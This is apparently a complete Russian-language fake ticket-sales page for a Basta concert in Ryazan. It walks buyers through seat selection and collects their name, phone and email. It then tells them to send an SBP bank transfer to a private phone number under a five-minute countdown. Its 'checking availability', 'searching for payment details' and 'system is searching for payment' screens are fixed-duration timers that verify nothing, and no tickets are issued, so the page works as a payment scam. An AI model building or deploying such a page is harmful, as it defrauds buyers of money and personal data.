<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Баста в Рязани — Билеты</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --accent: #ff3b30;
            --bg: #000;
            --card: #1c1c1e;
            --text: #ffffff;
            --gray: #8e8e93;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Inter', sans-serif; 
            background-color: var(--bg); 
            color: var(--text);
            overflow-x: hidden;
            min-height: 100vh;
        }

        /* Задний фон с фото */
        .hero-bg {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(to bottom, rgba(0,0,0,0.6), rgba(0,0,0,0.9)), 
                        url('https://images.wallpaperscraft.ru/image/single/concert_performance_hands_118151_1280x720.jpg'); /* Стабильный фон */
            background-size: cover; background-position: center;
            z-index: -1;
        }

        .container { max-width: 500px; margin: 0 auto; padding: 20px; position: relative; z-index: 1; }

        .top-badge { color: var(--accent); font-weight: 800; font-size: 13px; text-transform: uppercase; margin-bottom: 20px; letter-spacing: 1px; }
        .main-info h1 { font-size: 48px; font-weight: 800; line-height: 1; margin-bottom: 10px; }
        .event-details { font-size: 14px; color: var(--gray); margin-bottom: 30px; line-height: 1.5; }
        .event-details b { color: #fff; }

        /* Схема зала */
        .stadium-map {
            background: rgba(255,255,255,0.08); border-radius: 20px; padding: 15px; margin-bottom: 30px;
            border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(15px);
        }
        .stadium-map img { width: 100%; border-radius: 10px; display: block; filter: brightness(0.9); }
        .map-label { text-align: center; font-size: 11px; color: var(--gray); margin-top: 10px; text-transform: uppercase; }

        /* Карточки билетов */
        .ticket-item {
            background: rgba(28, 28, 30, 0.8); border-radius: 18px; padding: 20px; margin-bottom: 12px;
            display: flex; justify-content: space-between; align-items: center;
                       backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.05);
        }
        .t-name { font-weight: 600; font-size: 18px; }
        .t-price { color: var(--gray); font-size: 14px; margin-top: 4px; }
        
        .counter { display: flex; align-items: center; gap: 15px; }
        .btn-count { 
            width: 34px; height: 34px; border-radius: 50%; border: 1px solid #444;
            background: rgba(255,255,255,0.1); color: white; cursor: pointer; font-size: 20px;
        }
        .count-val { font-weight: 600; min-width: 20px; text-align: center; font-size: 18px; }

        /* Итоговая панель */
        .bottom-bar {
            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
            width: calc(100% - 40px); max-width: 460px;
            background: #fff; color: #000; padding: 20px; border-radius: 20px;
            display: flex; justify-content: space-between; align-items: center;
            cursor: pointer; box-shadow: 0 15px 35px rgba(0,0,0,0.5); z-index: 10;
        }
        .bottom-bar span { font-weight: 800; font-size: 20px; }

        /* Ввод данных */
        .form-title { font-size: 28px; font-weight: 800; margin-bottom: 25px; text-align: left; }
        input {
            width: 100%; padding: 18px; border-radius: 14px; border: 1px solid #333;
            background: #111; color: #fff; margin-bottom: 15px; font-size: 16px; outline: none;
        }
        input:focus { border-color: var(--accent); }

        .btn-main { background: #fff; color: #000; border: none; padding: 18px; border-radius: 14px; width: 100%; font-weight: 700; font-size: 17px; cursor: pointer; }

        /* Оплата */
        .pay-card { background: #fff; color: #000; padding: 25px; border-radius: 20px; margin-top: 20px; }
        .pay-card p { font-size: 13px; color: #666; margin-bottom: 4px; }
        .pay-card b { font-size: 22px; display: block; margin-bottom: 15px; }
        .no-link { color: inherit !important; text-decoration: none !important; }
        .timer { font-size: 32px; font-weight: 800; color: var(--accent); margin: 25px 0; text-align: center; }

        /* Загрузка */
        .loader { display: none; text-align: center; padding: 100px 20px; }
        .spinner {
            width: 45px; height: 45px; border: 4px solid #222; border-top: 4px solid var(--accent);
            border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 25px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .hidden { display: none; }
    </style>
</head>
<body>

<div class="hero-bg"></div>

<div class="container">
    <!-- Страница 1: Выбор -->
    <div id="step1">
        <div class="top-badge">Рязань Афиша</div>
        <div class="main-info">
            <h1>Баста</h1>
            <div class="event-details">
                <b>23 мая, 19:00</b><br>
                ДС «Олимпийский»<br>
                Рязань, ул. Зубковой, 12к2
            </div>
        </div>

        <div class="stadium-map">
            <img src="https://avatars.mds.yandex.net/get-afisha/411440/e33682948f95c024564c7f0709b30c04/origin" alt="Схема">
            <div class="map-label">Выберите сектор и количество билетов</div>
        </div>

        <div id="tickets">
            <div class="ticket-item">
                <div><div class="t-name">Танцпол</div><div class="t-price">2 500 ₽</div></div>
                <div class="counter">
                    <button class="btn-count" onclick="changeCount('t1', -1)">–</button>
                    <div class="count-val" id="t1">0</div>
                    <button class="btn-count" onclick="changeCount('t1', 1)">+</button>
                </div>
            </div>
            <div class="ticket-item">
                <div><div class="t-name">Фан-зона</div><div class="t-price">4 500 ₽</div></div>
                <div class="counter">
                    <button class="btn-count" onclick="changeCount('t2', -1)">–</button>
                    <div class="count-val" id="t2">0</div>
                    <button class="btn-count" onclick="changeCount('t2', 1)">+</button>
                </div>
            </div>
            <div class="ticket-item">
                <div><div class="t-name">Сектор VIP</div><div class="t-price">8 000 ₽</div></div>
                <div class="counter">
                    <button class="btn-count" onclick="changeCount('t3', -1)">–</button>
                    <div class="count-val" id="t3">0</div>
                    <button class="btn-count" onclick="changeCount('t3', 1)">+</button>
                </div>
            </div>
        </div>

        <div style="height: 100px;"></div> <!-- Отступ под кнопку -->
        <div class="bottom-bar" id="checkoutBtn" onclick="goToStep2()" style="display: none;">
            <div>Билетов: <span id="totalCount">0</span></div>
            <div>К оплате: <span id="totalPrice">0 ₽</span></div>
        </div>
    </div>

    <!-- Страница 2: Данные -->
    <div id="step2" class="hidden">
        <div class="form-title">Ваши данные</div>
        <input type="text" id="fio" placeholder="ФИО полностью">
        <!-- Поле телефона с фиксированным +7 -->
        <input type="tel" id="phone" value="+7 " oninput="handlePhone(this)" onfocus="if(this.value==='') this.value='+7 '">
        <input type="email" id="email" placeholder="E-mail для получения билета">
        <button class="btn-main" onclick="goToStep3()">Продолжить</button>
    </div>

    <!-- Страница 3: Оплата -->
    <div id="step3" class="hidden">
        <h2 style="text-align: center;">Оплата СБП</h2>
        <div class="timer" id="timer">05:00</div>
        
        <div class="pay-card">
            <p>Сумма перевода:</p>
            <b id="finalAmount">0 ₽</b>
            <p>Номер телефона (СБП):</p>
            <b class="no-link">+7 (929) 942 81 07</b>
            <p>Банк получателя:</p>
            <b>КБ Солидарность</b>
        </div>
        
        <button class="btn-main" style="margin-top: 25px; background: var(--accent); color: #fff;" onclick="verify()">Я оплатил(а)</button>
    </div>

    <!-- Финал -->
    <div id="stepFinal" class="hidden" style="text-align: center; margin-top: 50px;">
        <div style="font-size: 60px; margin-bottom: 20px;">✅</div>
        <h2>Заявка принята</h2>
        <p style="color: var(--gray); margin-top: 15px; line-height: 1.6;">
            Ожидайте подтверждение оплаты. Билеты будут отправлены на вашу почту в течение 24 часов после проверки транзакции модератором.
        </p>
    </div>

    <!-- Лоадер -->
    <div id="loader" class="loader">
        <div class="spinner"></div>
        <p id="loaderText" style="color: var(--gray);"></p>
    </div>
</div>

<script>
    const prices = { t1: 2500, t2: 4500, t3: 8000 };
    let counts = { t1: 0, t2: 0, t3: 0 };

    // Фиксация +7
    function handlePhone(input) {
        if (!input.value.startsWith('+7 ')) {
            input.value = '+7 ';
        }
    }

    function changeCount(id, delta) {
        counts[id] = Math.max(0, counts[id] + delta);
        document.getElementById(id).innerText = counts[id];
        updateTotal();
    }

    function updateTotal() {
        let total = (counts.t1 * prices.t1) + (counts.t2 * prices.t2) + (counts.t3 * prices.t3);
        let count = counts.t1 + counts.t2 + counts.t3;
        const btn = document.getElementById('checkoutBtn');
        if (count > 0) {
            btn.style.display = 'flex';
            document.getElementById('totalCount').innerText = count;
            document.getElementById('totalPrice').innerText = total.toLocaleString() + ' ₽';
        } else {
            btn.style.display = 'none';
        }
    }

    function showLoader(time, text, nextId) {
        document.querySelectorAll('.container > div:not(#loader)').forEach(d => d.classList.add('hidden'));
        const l = document.getElementById('loader');
        l.style.display = 'block';
        document.getElementById('loaderText').innerText = text;
        setTimeout(() => {
            l.style.display = 'none';
            document.getElementById(nextId).classList.remove('hidden');
            window.scrollTo(0,0);
        }, time);
    }

    function goToStep2() {
        showLoader(4000, "Проверка доступности билетов...", "step2");
    }

    function goToStep3() {
        const f = document.getElementById('fio').value;
        const e = document.getElementById('email').value;
        if(f.length < 5 || !e.includes('@')) { alert('Заполните данные верно'); return; }

        showLoader(4000, "Поиск свободных реквизитов...", "step3");
        document.getElementById('finalAmount').innerText = document.getElementById('totalPrice').innerText;
        startTimer(300);
    }

    function verify() {
        showLoader(20000, "Система ищет оплату...", "stepFinal");
    }

    function startTimer(duration) {
        let timer = duration, min, sec;
        const timerInt = setInterval(() => {
            min = parseInt(timer / 60, 10);
            sec = parseInt(timer % 60, 10);
            document.getElementById('timer').innerText = (min < 10 ? "0"+min : min) + ":" + (sec < 10 ? "0"+sec : sec);
            if (--timer < 0) { clearInterval(timerInt); }
        }, 1000);
    }
</script>

</body>
</html>
